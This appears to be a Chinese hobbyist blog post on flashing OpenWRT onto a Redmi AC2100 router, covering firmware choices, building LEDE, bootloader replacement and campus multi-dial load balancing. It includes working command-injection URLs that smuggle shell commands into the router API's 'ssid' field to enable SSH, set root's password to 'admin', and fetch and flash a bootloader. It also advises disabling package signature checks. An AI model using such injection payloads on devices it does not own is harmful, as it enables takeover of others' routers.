<!DOCTYPE html>
<html lang="zh-hans">

<head>
    
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
<meta name="HandheldFriendly" content="True" />
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
<meta name="generator" content="Hugo 0.93.3" />



<link rel="apple-touch-icon" sizes="180x180" href="icons/apple-touch-icon.png" />
<link rel="icon" type="image/png" sizes="32x32" href="icons/favicon-32x32.png" />
<link rel="icon" type="image/png" sizes="16x16" href="icons/favicon-16x16.png" />
<link rel="manifest" href="icons/site.webmanifest" />
<link rel="mask-icon" href="icons/safari-pinned-tab.svg" color="#8aa2d3" />
<link rel="shortcut icon" href="icons/favicon.ico" />
<meta name="theme-color" content="#ffffff" />


<title>红米 AC2100 刷机记录 - Origami404 的 Blog</title>


<meta name="author" content="Origami404" />


<meta name="description" content="有空的话就随便逛逛吧 www" />


<meta name="keywords" content="折腾, 刷机, 我会熟练地安装xxx系列" />


<meta property="og:title" content="红米 AC2100 刷机记录" />
<meta name="twitter:title" content="红米 AC2100 刷机记录" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://blog.origami404.top/post/2022-04-route/" /><meta property="og:description" content="背景
入手了一个 Redmi AC 2100, 我直接到手就刷 &hellip; 然后就折腾了整整两天.
在刷机的过程中, 我参考了很多教程, 发现刷机的方法简直多姿多彩, 很多教程走的路都不同. 于是我决定总结一下各种刷机方法的 &ldquo;路径交汇点&rdquo;, 并且在分享本人刷机路径的同时尝试描述其他的可选项, 让读者在将本文与其他教程交叉参阅时心中有数.
鉴于我初学路由器刷机不过三天, 出错或偏颇恐怕在所难免, 欢迎大佬发邮件指正.
本文假设读者具有基本的 Linux 与计算机网络知识." />
<meta name="twitter:description" content="背景
入手了一个 Redmi AC 2100, 我直接到手就刷 &hellip; 然后就折腾了整整两天.
在刷机的过程中, 我参考了很多教程, 发现刷机的方法简直多姿多彩, 很多教程走的路都不同. 于是我决定总结一下各种刷机方法的 &ldquo;路径交汇点&rdquo;, 并且在分享本人刷机路径的同时尝试描述其他的可选项, 让读者在将本文与其他教程交叉参阅时心中有数.
鉴于我初学路由器刷机不过三天, 出错或偏颇恐怕在所难免, 欢迎大佬发邮件指正.
本文假设读者具有基本的 Linux 与计算机网络知识." /><meta property="og:image" content="https://blog.origami404.top/img/og.png" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://blog.origami404.top/img/og.png" /><meta property="article:published_time" content="2022-04-20T01:12:56+00:00" /><meta property="article:modified_time" content="2022-04-20T01:12:56+00:00" />


<style>
    @media (prefers-color-scheme: dark) {
        body[data-theme='auto'] img {
            filter: brightness(60%);
        }
    }

    body[data-theme='dark'] img {
        filter: brightness(60%);
    }
</style>




<link rel="stylesheet" href="https://blog.origami404.top/assets/css/fuji.min.css" />








</head>

<body
  data-theme="auto"
  data-theme-auto='true'
  >
    <script data-cfasync="false">
  
  var fujiThemeData = localStorage.getItem('fuji_data-theme');
  
  if (!fujiThemeData) {
    localStorage.setItem('fuji_data-theme', 'auto');
  } else {
    
    if (fujiThemeData !== 'auto') {
      document.body.setAttribute('data-theme', fujiThemeData === 'dark' ? 'dark' : 'light');
    }
  }
</script>

    <header>
    <div class="container-lg clearfix">
        <div class="col-12 header">
            <a class="title-main" href="https://blog.origami404.top/">Origami404 的 Blog</a>
            
            <span class="title-sub">有空的话就随便逛逛吧 www</span>
            
        </div>
    </div>
</header>

    <main>
        <div class="container-lg clearfix">
            
            <div class="col-12 col-md-9 float-left content">
                
<article>
    
    <h2 class="post-item post-title">
        <a href="https://blog.origami404.top/post/2022-04-route/">红米 AC2100 刷机记录</a>
    </h2>
    <div class="post-item post-meta">
        <span><i class="iconfont icon-today-sharp"></i>&nbsp;2022-04-20</span>

<span><i class="iconfont icon-file-tray-sharp"></i>&nbsp;4050 字</span>

<span><i class="iconfont icon-pricetags-sharp"></i>&nbsp;<a href="/tags/%E6%8A%98%E8%85%BE">折腾</a>&nbsp;<a href="/tags/%E5%88%B7%E6%9C%BA">刷机</a>&nbsp;<a href="/tags/%E6%88%91%E4%BC%9A%E7%86%9F%E7%BB%83%E5%9C%B0%E5%AE%89%E8%A3%85xxx%E7%B3%BB%E5%88%97">我会熟练地安装xxx系列</a>&nbsp;</span>

    </div>
    
    <div class="post-content markdown-body">
        <h2 id="背景">背景</h2>
<p>入手了一个 Redmi AC 2100, 我直接到手就刷 &hellip; 然后就折腾了整整两天.</p>
<p>在刷机的过程中, 我参考了很多教程, 发现刷机的方法简直多姿多彩, 很多教程走的路都不同. 于是我决定总结一下各种刷机方法的 &ldquo;路径交汇点&rdquo;, 并且在分享本人刷机路径的同时尝试描述其他的可选项, 让读者在将本文与其他教程交叉参阅时心中有数.</p>
<p>鉴于我初学路由器刷机不过三天, 出错或偏颇恐怕在所难免, 欢迎大佬发邮件指正.</p>
<p>本文假设读者具有基本的 Linux 与计算机网络知识.</p>
<h2 id="各类固件介绍与获得">各类固件介绍与获得</h2>
<p>正如手机刷机可以选很多 ROM 一样, 路由器也有很多系统可选. 我首先选择了原版 OpenWRT 安装, 因为我比较注重动手学习的过程, 并且刚刚好最近两天比较有空, 可以痛苦挣扎两天 :(.</p>
<h3 id="原版-openwrt">原版 OpenWRT</h3>
<p>比较纯粹, 比较官方, 很折腾. 但是对我这种不撞南墙不回头, 心里就想着折腾的人很合适.</p>
<p>OpenWRT 官方的 Release 仓库是 <code>https://downloads.openwrt.org/</code>, 想要刷最新的 release 版 (成文时为 21.02) 的 OpenWRT, 只要去下面的网址里查找 <code>redmi</code> 即可:</p>
<pre><code>https://downloads.openwrt.org/releases/21.02.0/targets/ramips/mt7621/
</code></pre>
<p><img class="img-zoomable" src="https://user-images.githubusercontent.com/29816865/164249030-3494cfe8-1c6b-4679-a69b-7516595b6c4b.png" alt="如图" />
</p>
<p>图里的四个 <code>.bin</code> 文件各有用处:</p>
<ul>
<li>结尾是 <code>initramfs-kernel</code> 的: 顾名思义, &ldquo;init ram fs kernel&rdquo;, 只包含 <code>/boot</code> 里的初始内存文件系统跟内核, 完全不保存持久数据, 一切都在内存里, 重启了所有配置都会消失, 一般用作 <strong>底包</strong>. Breed 只认这种固件.</li>
<li>结尾是 <code>squashfs-kernel1</code>, <code>squashfs-rootfs0</code> 的: 是正常的持久化系统, 0/1 的后缀代表了它们要被刷入不同的分区. 一般用于 <strong>命令行刷入</strong>.</li>
<li>结尾是 <code>squashfs-sysupgrade</code> 的: 用于 LuCI Web 界面的, 是给已经有 OpenWRT 的系统升级用的, 一般用于 <strong>Web 刷入</strong>.</li>
</ul>
<p>按照你所选择的刷机方式选择下好你想要的包即可. 或者如果你路由器关了就没网的话, 全下了备着也可以.</p>
<h3 id="各类基于-openwrt-的定制固件">各类基于 OpenWRT 的定制固件</h3>
<p>恩山上有很多各种各样的大佬定制插件, 看帖然后按链接下载就可以了. 我推荐一个我用过的:</p>
<ul>
<li><a href="https://www.right.com.cn/forum/thread-4027477-1-1.html" target="_blank">hfy166</a></li>
<li><a href="https://www.right.com.cn/forum/thread-8101468-1-1.html" target="_blank">hfy166 固件的新下载链接</a></li>
</ul>
<p>另外根据 Zs 佬的博客, 我发现了另一个看起来挺好用的:</p>
<ul>
<li><a href="https://www.right.com.cn/forum/thread-4107734-1-1.html" target="_blank">snowlxylxy</a></li>
</ul>
<h3 id="编译-lean-大的-lede">编译 Lean 大的 LEDE</h3>
<p>是官方 OpenWRT 的一个 fork, 集合了很多常用插件, 需要自己编译. 编译过程如下:</p>
<p>按照 <a href="https://github.com/coolsnowwolf/lede" target="_blank">GitHub Repo</a> 里首先安装编译依赖并且下载好代码:</p>
<pre><code class="language-sh">sudo apt update -y
sudo apt full-upgrade -y
sudo apt install -y ack antlr3 asciidoc autoconf automake autopoint binutils bison build-essential \
bzip2 ccache cmake cpio curl device-tree-compiler fastjar flex gawk gettext gcc-multilib g++-multilib \
git gperf haveged help2man intltool libc6-dev-i386 libelf-dev libglib2.0-dev libgmp3-dev libltdl-dev \
libmpc-dev libmpfr-dev libncurses5-dev libncursesw5-dev libreadline-dev libssl-dev libtool lrzsz \
mkisofs msmtp nano ninja-build p7zip p7zip-full patch pkgconf python2.7 python3 python3-pip qemu-utils \
rsync scons squashfs-tools subversion swig texinfo uglifyjs upx-ucl unzip vim wget xmlto xxd zlib1g-dev
git clone https://github.com/coolsnowwolf/lede
cd lede
</code></pre>
<p>如果需要 SSR 等中国特色插件, 可以编辑 <code>feeds.conf.default</code> 文件, 加入此 <a href="https://github.com/fw876/helloworld" target="_blank">Repo</a>:</p>
<pre><code class="language-sh">echo &quot;src-git helloworld https://github.com/fw876/helloworld.git&quot; &gt;&gt; &quot;feeds.conf.default&quot;
</code></pre>
<blockquote>
<p>其他的中国特色插件, 可以按需添加:</p>
<ul>
<li><code>src-git opentopd  https://github.com/sirpdboy/sirpdboy-package</code></li>
<li><code>src-git passwall https://github.com/xiaorouji/openwrt-passwall</code></li>
<li><code>src-git OpenClash https://github.com/vernesong/OpenClash</code></li>
<li><code>src-git lienol https://github.com/Lienol/openwrt-package</code></li>
</ul>
</blockquote>
<p>随后再按照原 Repo 中的步骤, 先更新 feeds, 选择编译选项:</p>
<pre><code class="language-sh">./scripts/feeds update -a
./scripts/feeds install -a
make menuconfig
</code></pre>
<p>然后根据参考中恩山的帖子中的说法开始编译:</p>
<pre><code class="language-sh">source /etc/environment
make -j8 download V=s
make -j1 V=s
</code></pre>
<p>首次编译建议 jobs 设置为 1, 不容易出问题. 自信的/欧的读者可以大胆开 -j8. 编译后的文件会在 <code>bin/target/ramips/mt7621</code> 下:</p>
<pre><code class="language-sh">root@6ecfdee89de4:/opt/source/lede# ls -lh bin/targets/ramips/mt7621/
total 33M
-rw-r--r-- 1 root root  775 Apr 20 11:51 config.buildinfo
-rw-r--r-- 1 root root   71 Apr 20 11:51 feeds.buildinfo
-rw-r--r-- 1 root root  11M Apr 20 11:56 openwrt-ramips-mt7621-xiaomi_redmi-router-ac2100-initramfs-kernel.bin       # Bread 底包
-rw-r--r-- 1 root root 2.5M Apr 20 11:56 openwrt-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-kernel1.bin       # SSH 里用
-rw-r--r-- 1 root root 9.2M Apr 20 11:56 openwrt-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-rootfs0.bin       # SSH 里用
-rw-r--r-- 1 root root  11M Apr 20 11:56 openwrt-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-sysupgrade.bin    # Web 里用
-rw-r--r-- 1 root root 5.9K Apr 20 11:56 openwrt-ramips-mt7621-xiaomi_redmi-router-ac2100.manifest
drwxr-xr-x 2 root root  12K Apr 20 11:56 packages
-rw-r--r-- 1 root root  920 Apr 20 11:56 sha256sums
-rw-r--r-- 1 root root   11 Apr 20 11:51 version.buildinfo
</code></pre>
<blockquote>
<p>由于我的编译环境在 Docker 内, 所以我运行了 <code>export FORCE_UNSAFE_CONFIGURE=1</code> 后直接用 root 用户编译了. 在正常的 Linux 环境下的用户不要学我.</p>
</blockquote>
<p>如果不想编译整个系统, 而是只想编译出插件的, 可以阅读参考中的文章. 编译出来的四个 <code>.bin</code> 文件的作用与 OpenWRT 官网下载下来的同后缀文件相同.</p>
<p>参考:</p>
<ul>
<li><a href="https://www.right.com.cn/forum/thread-4073227-1-1.html" target="_blank">huang826</a></li>
<li><a href="https://jackeroo.org/openwrt-complie-guide/" target="_blank">Jackeroo</a></li>
<li><a href="https://jarviswwong.com/compile-ipk-separately-with-openwrt.html" target="_blank">单独编译插件</a></li>
</ul>
<h3 id="老毛子--潘多拉">老毛子 / 潘多拉</h3>
<p>是同一个系统 &ldquo;padavan&rdquo; 的别名, 网上很多教程, 但是可能对坏块兼容性不足. 因为我扫出了坏块, 并且不想要这种不太透明的固件, 所以我没有刷过这个. 有兴趣的读者应该很容易在网上找到这两个的资料.</p>
<h2 id="刷机过程">刷机过程</h2>
<p>刷机路千万条, 据我所知, 总结起来大概是下面这张状态转移图:</p>
<p><img class="img-zoomable" src="https://user-images.githubusercontent.com/29816865/164251080-fe6dc55f-3749-4c93-8bce-90ac5569f0c0.png" alt="刷机路径图" />
</p>
<p>每一个方框代表一个条件, 如果你的路由器符合了方框里的字就可以认为是处在该状态. 在特定的状态下执行特定操作可以转移到其他状态. 下面的各个三级标题分别详细描述了蓝色转移边的操作. 绿色转移边操作过于简单, 故不展开.</p>
<p>在我的刷机操作中, 我选择了路径:</p>
<pre><code>小米原系统 --&gt; OpenWRT 带 SSH --&gt; Bootloader 为 Breed --&gt; OpenWRT 带 LuCI --&gt; 新系统
</code></pre>
<p>的路径. 现在回想, 可能使用下面的路径更加方便:</p>
<pre><code>小米原系统 --&gt; OpenWRT 带 SSH --&gt; Bootloader 为 Breed --&gt; OpenWRT 带 SSH --&gt; 新系统
</code></pre>
<p>读者自行决断.</p>
<h3 id="获取原系统的控制权">获取原系统的控制权</h3>
<p>首先, 就好像刷机首先要解锁一样, 为了干掉原系统, 我们首先得获得原系统的最高权限.</p>
<h4 id="1-web-漏洞开启-ssh">(1) Web 漏洞开启 SSH</h4>
<p>在现在 (2022 年 4 月), 最流行并且最方便的方法大概就是这个了. 首先需要通过官方系统的刷机页面刷到特定的带 bug 版本的官方系统, 然后访问两个特殊 url 开启即可.</p>
<p>首先下载带 Bug 的官方系统, 版本是 2.0.7. 网上很多走官方 CDN 的固件下载链接, 不知道为什么我都打不开. 所以如果读者有同样问题的话, 可以去看看参考里恩山一个帖子给的百度云链接, 或者是我给的奶牛快传链接下载. 下载后在官方固件的系统更新里直接上传刷入即可.</p>
<blockquote>
<p>OpenWRT 官网的教程也是走官方 CDN, 不过版本是 2.0.23. 我自己尝试的时候是用 2.0.7 的.</p>
</blockquote>
<p>随后是访问两个特殊的 URL 来开启 SSH. 首先登录官方系统, 然后看浏览器的地址栏, 此时的网址应该是类似这样的:</p>
<pre><code>http://192.168.31.1/cgi-bin/luci/;stok=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx/web/home#router
</code></pre>
<p>记住 <code>stok</code> 参数的值, 下面经常要用到. 随后依次访问下面两个 URL:</p>
<pre><code>http://192.168.31.1/cgi-bin/luci/;stok=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx/api/misystem/set_config_iotdev?bssid=Xiaomi&amp;user_id=longdike&amp;ssid=-h%3B%20nvram%20set%20ssh_en%3D1%3B%20nvram%20commit%3B%20sed%20-i%20's%2Fchannel%3D.*%2Fchannel%3D%5C%22debug%5C%22%2Fg'%20%2Fetc%2Finit.d%2Fdropbear%3B%20%2Fetc%2Finit.d%2Fdropbear%20start%3B
</code></pre>
<pre><code>http://192.168.31.1/cgi-bin/luci/;stok=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx/api/misystem/set_config_iotdev?bssid=Xiaomi&amp;user_id=longdike&amp;ssid=-h%3B%20echo%20-e%20'admin%5Cnadmin'%20%7C%20passwd%20root%3B
</code></pre>
<p>第一个 URL 利用 LuCI 的漏洞开启路由器的 SSH, 第二个则将 root 密码设为 <code>admin</code>.</p>
<p><strong>访问 URL 后页面应该显示 <code>{&quot;code&quot;: 0}</code>, 如果不是建议检查固件版本, 或重新刷入正确旧版固件</strong></p>
<p>在访问完这两个 URL 之后, 直接开个 PowerShell <code>ssh root@192.168.31.1</code> 就能进去了.</p>
<blockquote>
<p>检查 NAND 坏块</p>
<p>获得 stok 值后, 访问下面的 URL:</p>
<pre><code>http://192.168.31.1/cgi-bin/luci/;stok=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx/api/misystem/set_config_iotdev?bssid=Xiaomi&amp;user_id=longdike&amp;ssid=%0A%5B%20-z%20%22%24(dmesg%20%7C%20grep%20ESMT)%22%20%5D%20%26%26%20B%3D%22Toshiba%22%20%7C%7C%20B%3D%22ESMT%22%0Auci%20set%20wireless.%24(uci%20show%20wireless%20%7C%20awk%20-F%20'.'%20'%2Fwl1%2F%20%7Bprint%20%242%7D').ssid%3D%22%24B%20%24(dmesg%20%7C%20awk%20'%2FBad%2F%20%7Bprint%20%245%7D')%22%0A%2Fetc%2Finit.d%2Fnetwork%20restart%0A
</code></pre>
<p>等待一会后, 2.4G WiFi 的名字就会被修改为 <code>&lt;闪存厂商&gt; &lt;坏块编号&gt;*</code> 的格式了</p>
</blockquote>
<p>参考:</p>
<ul>
<li><a href="https://openwrt.org/toh/xiaomi/xiaomi_redmi_router_ac2100#obtain_ssh_access_using_a_web_exploit" target="_blank">OpenWRT RM2100 介绍</a></li>
<li><a href="https://www.right.com.cn/forum/thread-4047038-1-1.html" target="_blank">恩山: 小米/红米 AC 2100 官方固件下载</a></li>
<li><a href="https://cowtransfer.com/s/cbacd9a3387444" target="_blank">奶牛快传: 红米 AC2100 官方 2.0.7 版本固件</a></li>
<li><a href="https://www.zzsqwq.cn/posts/209/#%e6%89%93%e5%bc%80%e8%b7%af%e7%94%b1%e5%99%a8-ssh" target="_blank">Zs 博客: Redmi AC2100刷写OpenWrt教程</a></li>
<li><a href="https://www.right.com.cn/forum/thread-4066963-1-1.html" target="_blank">恩山: 检查坏块</a></li>
</ul>
<h4 id="2-利用其他漏洞开启-telnet">(2) 利用其他漏洞开启 Telnet</h4>
<p>请自行参考恩山的帖子: <a href="https://www.right.com.cn/forum/thread-4023907-1-1.html" target="_blank">https://www.right.com.cn/forum/thread-4023907-1-1.html</a></p>
<h3 id="刷-bl">刷 BL</h3>
<p>现在的路由器跟手机差不多, 也有一个 Bootloader 和一块真正用来放系统的闪存.</p>
<p>Breed, 又称为不死固件, 是一个类似手机上 TWRP 的一个 Bootloader, 可以让用户方便地通过一个 Web 界面上传固件并刷入, 不过其支持刷入固件的方式比较有限. 若是通过 Breed 刷机, 一般都是先刷入一个 Breed 能刷的 &ldquo;底包&rdquo;, 然后再进入底包的系统, 再在那里上传真正的刷机包刷入. 详见刷底包跟 Web 刷入.</p>
<p>刷入了 Breed 之后, 普通的断电重启会进入正常的系统, 而按住 reset 断电重启就会进入 Breed. 进入 Breed 之后访问 <code>http://192.168.1.1</code> 就可以看到 Breed 的界面.</p>
<blockquote>
<p>你问我怎么断电重启? 拔电源线再插上啊 (</p>
</blockquote>
<p>参考:</p>
<ul>
<li><a href="https://www.right.com.cn/forum/thread-4066963-1-1.html" target="_blank">恩山 jinglei207</a></li>
</ul>
<!-- 经常刷机, 哪会没有刷坏的一天. 所以为了给自己留条退路 + 学习 Breed 下的刷入方法, 我选择先刷入 Breed, 再通过 Breed 刷入底包, 随后刷入目标系统的方式. 当然对于小米的官方固件或者是原本就是 OpenWRT 的系统, 如果你能拿到 root 的 SSH, 大可以刷完 Breed 后直接在原系统刷入目标系统, 而不需要先刷一个 Breed 支持的底包.  -->
<h4 id="1-通过小米原版固件的-web-漏洞执行命令">(1) 通过小米原版固件的 Web 漏洞执行命令</h4>
<blockquote>
<p>只有小米原版 v2.0.7 固件才可以这样做! 并不是所有 OpenWRT 类系统都可以这样干!</p>
</blockquote>
<p>访问下面的 URL 即可:</p>
<pre><code>http://192.168.31.1/cgi-bin/luci/;stok=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx/api/misystem/set_config_iotdev?bssid=Xiaomi&amp;user_id=longdike&amp;ssid=%0Acd%20%2Ftmp%0Acurl%20-o%20B%20-O%20https%3A%2F%2Fbreed.hackpascal.net%2Fr1286%2520%255b2020-10-09%255d%2Fbreed-mt7621-xiaomi-r3g.bin%20-k%20-g%0A%5B%20-z%20%22%24(sha256sum%20B%20%7C%20grep%20242d42eb5f5aaa67ddc9c1baf1acdf58d289e3f792adfdd77b589b9dc71eff85)%22%20%5D%20%7C%7C%20mtd%20-r%20write%20B%20Bootloader%0A
</code></pre>
<p>路由器会在 60s 内重启.</p>
<h4 id="2-命令行操作">(2) 命令行操作</h4>
<p>在 SSH 中执行下面的命令即可下载并输入 Breed.</p>
<pre><code>cd /tmp
curl -o Breed.bin -O https://breed.hackpascal.net/breed-mt7621-xiaomi-r3g.bin -k
md5sum Breed.bin # 检查输出的 md5 是否为 a9bc8da9d1b673748e079a9e7fb9e388 
mtd -r write Breed.bin Bootloader
</code></pre>
<h4 id="一个小坑">一个小坑</h4>
<p>如果你刷入了正常的系统, 然后那个系统也用 <code>192.168.1.1</code> 当网关, 你又访问过它的 LuCI 界面的话, 浏览器有可能会记住一个从 <code>http://192.168.1.1</code> 到 <code>http://192.168.2.1/cgi-bin/luci/</code> 的跳转. 当你进入 Breed, 重新访问 <code>192.168.1.1</code> 的时候, 浏览器就会自作主张地帮你跳转到它记住的 URL, 然后你就会看到一个 Breed 的报错. 我还没研究出怎么样清除浏览器的记忆, 不过如果你遇到这种情况, 请直接开一个无痕模式去访问, 就没有问题了.</p>
<p>有人可能会觉得这是 Breed 的地址跟固件的 <strong>冲突</strong> 了, 但是实际上只是 <strong>浏览器</strong> 自作主张罢了. 冲突是不会冲突的, 因为固件跟 Breed 根本就 <strong>不会同时运行</strong>; 唯一有可能冲突的情况是, <code>192.168.1.1</code> 这个地址被路由器的上游用了(比如非桥接模式的移动光猫就会用这个地址当网关), 这种情况只要拔掉路由器的 wan 线就可以了. 不过当时还是让我迷惑了好一会的, 我还翻到了这个<a href="https://www.right.com.cn/forum/thread-4043795-1-1.html" target="_blank">恩山帖子</a>, 我估摸着楼主可能跟我是同一个情况, 但是其他人不知道(还有反问楼主为什么插 wan 线刷机的, 可能理解歪了).</p>
<p>还有一些其他帖子是真的没拔 wan 线, 下面基本上就直接开骂了 (乐).</p>
<h3 id="刷底包">刷底包</h3>
<p>首先拔掉电源线, 按住 reset, 然后插入电源线, 保持按住 reset 直到闪黄灯为止. 随后浏览器访问 <code>192.168.1.1</code>, 即可进入到 Breed 的界面.</p>
<p><img class="img-zoomable" src="https://user-images.githubusercontent.com/29816865/164584016-ec60df7d-434a-4a92-bba6-37a0825e0d56.png" alt="Breed 界面" />
</p>
<p>首先添加一个环境变量:</p>
<p><img class="img-zoomable" src="https://user-images.githubusercontent.com/29816865/164584020-0e631526-7012-4235-8ef3-5d339bdd113d.png" alt="Breed 环境变量" />
</p>
<p>接着在固件刷写界面, 选择第二个固件, 上传结尾为 <code>initramfs-kernel</code> 的底包, 勾选自动重启, 上传后等待刷入重启即可.</p>
<p><img class="img-zoomable" src="https://user-images.githubusercontent.com/29816865/164584021-4c7b5bd3-d218-4073-8e7d-89e48fdc83fe.png" alt="上传界面" />
</p>
<p>重启后便进入底包的系统了. 这个系统是 RAM Only 的, 配置重启就无了, 所以不要尝试直接用底包的系统.</p>
<h3 id="web-刷入">Web 刷入</h3>
<p>在确保路由器刷写完成并且重启了之后, 访问 <code>http://192.168.1.1/cgi-bin/luci/admin/system/flash</code> 进入系统升级页面.</p>
<p><img class="img-zoomable" src="https://user-images.githubusercontent.com/29816865/164255400-d58b9564-8629-41b7-905b-adb2147c74f0.png" alt="系统界面" />
</p>
<p>上传结尾为 <code>sysupgrade</code> 的镜像等待自动更新即可.</p>
<h3 id="命令行刷入">命令行刷入</h3>
<blockquote>
<p>在获得原系统的控制权一节里的启动 SSH 的命令里已经设置了 nvram 了, 不用重复设置了.</p>
</blockquote>
<p>在 Windows 下开一个 PowerShell, 将两个固件上传到路由器 <code>/tmp</code> 目录上:</p>
<pre><code class="language-sh">scp openwrt-21.02.0-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-kernel1.bin root@192.168.31.1:/tmp
scp openwrt-21.02.0-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-rootfs0.bin root@192.168.31.1:/tmp
</code></pre>
<p>随后 SSH 到路由器上, 按下面的顺序用 mtd 刷写即可:</p>
<pre><code>cd /tmp
mtd write openwrt-21.02.0-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-kernel1.bin kernel1
mtd -r write openwrt-21.02.0-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-rootfs0.bin rootfs0
</code></pre>
<p>路由器应该会自动重启, 如果没有, 就手动重插电源线. 重启后应该就能进入 OpenWRT 了.</p>
<h2 id="刷机之后">刷机之后</h2>
<h3 id="修改-opkg-源">修改 opkg 源</h3>
<p>中国特色步骤. 这里我选择了中科大的源. 根据中科大的<a href="https://mirrors.ustc.edu.cn/help/openwrt.html" target="_blank">文档</a>, 首先改成 http 源, 下载必要的包, 然后马上改成 https 源.</p>
<pre><code class="language-sh">sed -i 's/downloads.openwrt.org/mirrors.ustc.edu.cn\/openwrt/g' /etc/opkg/distfeeds.conf
opkg update
opkg install libustream-openssl ca-bundle ca-certificates
sed -i 's/http/https/g' /etc/opkg/distfeeds.conf
opkg update
</code></pre>
<h3 id="获取各类特色插件">获取各类特色插件</h3>
<h4 id="软件仓库">软件仓库</h4>
<p>在网上找到了一个比较全的中国特色插件仓库: <a href="https://github.com/kiddin9/openwrt-packages" target="_blank">https://github.com/kiddin9/openwrt-packages</a></p>
<p>将仓库添加到 <code>/etc/opkg/customfeeds.conf</code>:</p>
<pre><code>echo 'src/gz openwrt_kiddin9 https://op.supes.top/packages/mipsel_24kc' &gt;&gt; /etc/opkg/customfeeds.conf
</code></pre>
<p>随后编辑 <code>/etc/opkg.conf</code>, 注释(<code>#</code>)掉 <code>option check_signature</code>, 更新源即可.</p>
<pre><code>opkg update
</code></pre>
<h4 id="手动编译">手动编译</h4>
<p>详见 <a href="#%e7%bc%96%e8%af%91-lean-%e5%a4%a7%e7%9a%84-lede">编译 lean 大的 lede</a> 一节的参考资料.</p>
<h3 id="校园网多拨-ipv4">校园网多拨 (IPv4)</h3>
<h4 id="手动配置">手动配置</h4>
<p>所谓多拨(下面以两拨介绍), 就是创建两个(虚拟)物理设备连上真实的物理设备, 绑定到两个接口, 然后在两个接口之间做链路层负载均衡.</p>
<p>首先安装所需的软件包:</p>
<pre><code>opkg install kmod-macvlan mwan3 luci-app-mwan3 luci-i18n-mwan3-zh-cn
</code></pre>
<p>我们的校园网的 DHCP 分 IP 下来, 然后登录使用的. 所以我这里的接口全部都设了 DHCP 协议.</p>
<p>如下在 LuCI 中创建设备(多少拨就创建多少个):</p>
<p><img class="img-zoomable" src="https://user-images.githubusercontent.com/29816865/164264922-1a851fa9-3ded-4626-aced-97a5ff8a0ad9.png" alt="" />
</p>
<p><img class="img-zoomable" src="https://user-images.githubusercontent.com/29816865/164263632-c72df003-75e2-4e57-9a28-6e0601b0948c.png" alt="" />
</p>
<p>随后如下创建接口(多少拨就创建多少个, 一个设备一个接口). 要注意的是, 各个接口的网关越点一定要互不相同, 下面的 mwan 要依此来做分流.</p>
<p><img class="img-zoomable" src="https://user-images.githubusercontent.com/29816865/164264151-37e627e9-13ce-47c4-9741-97e4eeb0e35a.png" alt="" />
</p>
<p><img class="img-zoomable" src="https://user-images.githubusercontent.com/29816865/164266238-4209898c-bef6-4cd5-bc83-69aa30ea2cd2.png" alt="" />
</p>
<p><img class="img-zoomable" src="https://user-images.githubusercontent.com/29816865/164263737-262bc267-690b-49a0-8433-bee1d8b0cae2.png" alt="" />
</p>
<p>然后去 MWAN 界面设置负载均衡:</p>
<p><img class="img-zoomable" src="https://user-images.githubusercontent.com/29816865/164264285-67fbbe0e-91c8-472b-a676-426b5fe86dbf.png" alt="" />
</p>
<p><img class="img-zoomable" src="https://user-images.githubusercontent.com/29816865/164264260-fdda3553-ce0b-4ad1-806a-da5ef64da980.png" alt="" />
</p>
<p><img class="img-zoomable" src="https://user-images.githubusercontent.com/29816865/164264334-c75fbaf0-0aa5-4c6c-94de-5a4ff8c8830c.png" alt="" />
</p>
<p><img class="img-zoomable" src="https://user-images.githubusercontent.com/29816865/164264362-0dc911f1-622c-4776-ae12-6cf93124af21.png" alt="" />
</p>
<p><img class="img-zoomable" src="https://user-images.githubusercontent.com/29816865/164264379-d8b3831e-1343-41c4-a7ba-553754358900.png" alt="" />
</p>
<p>不出意外, 刷新一下网络, 登录即可. 可以去跑一个 speedtest 来看看有没有得到两倍带宽.</p>
<p>阅读参考的要注意. 我按照参考里的命令创建的 macvlan 设备完全申请不到 IP 地址, 但是在 LuCI 里创建的就可以, 我都不知道为什么. 而且参考里叫我绑定 <code>eth0</code> 这个以太网交换机, 但是我绑了是不行的, 只有绑定 <code>wan</code> 这个交换机端口才行, 我目前也不知道为什么. 如果读者里有大佬知道的还请赐教.</p>
<p>参考:</p>
<ul>
<li><a href="https://www.red-yellow.net/openwrt%E7%9A%84%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E5%8F%8A%E5%A4%9A%E7%BA%BF%E5%A4%9A%E6%8B%A8%E6%8E%A7%E5%88%B6%E5%BA%94%E7%94%A8mwan3.html" target="_blank">路由智态: openwrt 的负载均衡及多线多拨控制应用 mwan3</a></li>
<li><a href="https://www.red-yellow.net/%E5%8D%95%E7%BA%BF%E5%A4%9A%E6%8B%A8%E5%9C%A8openwrt%E7%B3%BB%E7%BB%9F%E4%B8%AD%E7%9A%84%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95.html" target="_blank">路由智态: 单线多拨在 openwrt 系统中的实现方法</a></li>
</ul>
<h4 id="syncdial-插件">syncdial 插件</h4>
<p>插件使用起来很无脑, 如果你已经加入了 <a href="#%e8%bd%af%e4%bb%b6%e4%bb%93%e5%ba%93">获取各类特色插件</a> 里的仓库, 那么直接安装即可获得该插件:</p>
<pre><code>opkg install luci-app-syncdial
</code></pre>
<p>具体使用请读者自行摸索, 我还没用过.</p>
<h3 id="校园网-ipv6-nat6">校园网 IPv6 NAT6</h3>
